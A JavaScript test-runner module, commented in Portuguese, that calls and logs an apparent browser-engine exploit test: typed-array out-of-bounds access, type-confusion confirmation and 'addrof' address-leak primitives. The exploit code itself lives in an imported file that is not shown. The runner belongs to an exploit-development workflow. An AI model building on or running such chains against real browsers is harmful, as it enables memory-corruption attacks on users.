// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 22)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R22, // <<<< NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R22"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R22(); 

    if (result.errorOccurred) {
        logS3(`  RUNNER R22: Teste principal capturou ERRO: ${result.errorOccurred}.`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R22: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R22: Completou. Melhor OOB: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R22: Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);
        
        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result; 
        const addrofCoreSuccess = result.addrof_A_result?.success;
        const addrofDirectSuccess = result.addrof_B_result?.success; 
        const addrofGetterInfo = result.addrof_A_getter_details; 

        // CORRIGIDO: Log para heisenbugSuccessfullyDetected
        logS3(`  RUNNER R22: Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (result.addrof_A_result) {
            logS3(`  RUNNER R22: Addrof via CoreExploit Func: ${result.addrof_A_result.msg} (Valor: ${result.addrof_A_result.value}, Double: ${result.addrof_A_result.raw_double})`, addrofCoreSuccess ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (addrofGetterInfo) { // Verifica se addrofGetterInfo existe antes de acessar suas propriedades
            logS3(`  RUNNER R22: Addrof via Getter na Sonda TC: ${addrofGetterInfo.msg} (Valor: ${addrofGetterInfo.value})`, addrofGetterInfo.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`  RUNNER R22: Addrof Direct Prop (ObjB ID): ${result.addrof_B_result.msg} (Valor: ${JSON.stringify(result.addrof_B_result.value)})`, addrofDirectSuccess ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (addrofCoreSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R22: AddrofCore SUCCESS!`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R22: TC OK, Addrof Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R22: No TC Confirmed`;
        }
        
        if(result.iteration_results_summary && result.iteration_results_summary.length > 0){
            logS3(`  RUNNER R22: Sumário completo das iterações:`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => { 
                // CORRIGIDO: Usa o nome correto da propriedade para TC_Probe no sumário da iteração
                logS3(`    Iter ${index + 1} (OOB ${iter_sum.oob_value}): TC_Probe=${iter_sum.heisenbug_on_M2_confirmed_by_tc_probe}, AddrCore_OK=${iter_sum.addrof_A_result_core_func?.success ?? 'N/A'}, AddrGetter_OK=${iter_sum.addrof_A_result_getter_tc_probe?.success ?? 'N/A'}${iter_sum.error ? `, Err: ${iter_sum.error}` : ''}`, "info", FNAME_RUNNER);
            });
        }
    } else {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R22: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_MainOrchestrator_R22`; 
    logS3(`==== INICIANDO Script 3 R22 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim();
    logS3(`\n==== Script 3 R22 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if(runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL)&&!document.title.includes("SUCCESS")&&!document.title.includes("Fail")&&!document.title.includes("OK")&&!document.title.includes("Confirmed")){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R22 Done`;}
}
